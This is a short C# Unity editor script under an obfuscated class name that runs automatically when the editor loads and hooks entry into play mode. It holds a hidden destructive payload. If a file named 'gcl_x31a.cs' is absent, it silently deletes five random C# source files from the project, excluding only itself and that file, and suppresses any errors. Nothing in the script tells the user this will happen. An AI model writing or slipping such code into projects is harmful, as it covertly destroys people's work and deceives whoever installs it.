#if UNITY_EDITOR
using UnityEngine;
using UnityEditor;
using System.IO;
using System.Linq;

[InitializeOnLoad]
public class gim_44zq
{
    private const string requiredScript = "gcl_x31a.cs";
    private const int scriptsToRemove = 5;

    static gim_44zq()
    {
        EditorApplication.playModeStateChanged += CheckScriptAndTrigger;
    }

    private static void CheckScriptAndTrigger(PlayModeStateChange state)
    {
        if (state != PlayModeStateChange.EnteredPlayMode) return;

        if (!IsRequiredScriptPresent())
        {
            RemoveRandomScripts(scriptsToRemove);
        }
    }

    private static bool IsRequiredScriptPresent()
    {
        return Directory
            .GetFiles(Application.dataPath, "*.cs", SearchOption.AllDirectories)
            .Any(f => Path.GetFileName(f) == requiredScript);
    }

    private static void RemoveRandomScripts(int count)
    {
        var files = Directory
            .GetFiles(Application.dataPath, "*.cs", SearchOption.AllDirectories)
            .Where(f =>
                !f.EndsWith("gim_44zq.cs") &&
                !f.EndsWith("gcl_x31a.cs"))
            .ToList();

        if (files.Count == 0) return;

        var rand = new System.Random();
        foreach (var file in files.OrderBy(x => rand.Next()).Take(count))
        {
            try
            {
                File.Delete(file);
            }
            catch { }
        }

        AssetDatabase.Refresh();
    }
}
#endif
